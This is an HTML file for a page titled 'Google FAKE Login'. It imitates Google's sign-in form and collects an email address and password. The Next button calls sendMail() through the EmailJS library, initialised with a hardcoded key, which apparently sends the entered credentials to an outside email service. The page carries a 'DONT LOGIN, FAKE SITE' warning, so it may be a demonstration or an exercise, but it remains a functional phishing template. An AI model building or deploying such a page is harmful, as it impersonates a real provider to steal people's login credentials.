<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google FAKE Login</title>
    <link rel="stylesheet" href="styles.css">
    <script src="sendEmail.js"></script>
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
    ></script>
    <script type="text/javascript">
      (function () {
        emailjs.init("9hl9awywx6zp2sVjR");
      })();
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="google_logo.png" alt="Google Logo">
        </div>
        <form class="login-form" id="loginForm">
            <input type="text" id="email" name="email" placeholder="Email or phone" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <div class="checkbox">
                <input type="checkbox" id="rememberMe">
                <label for="rememberMe">Remember me DONT LOGIN, FAKE SITE</label>
            </div>
            <button class="btn btn-primary" onclick="sendMail()">Next</button>
            <div class="links">
                <a href="#">Forgot password?</a>
                <a href="#">Create account</a>
            </div>
        </form>
    </div>
</body>
</html>
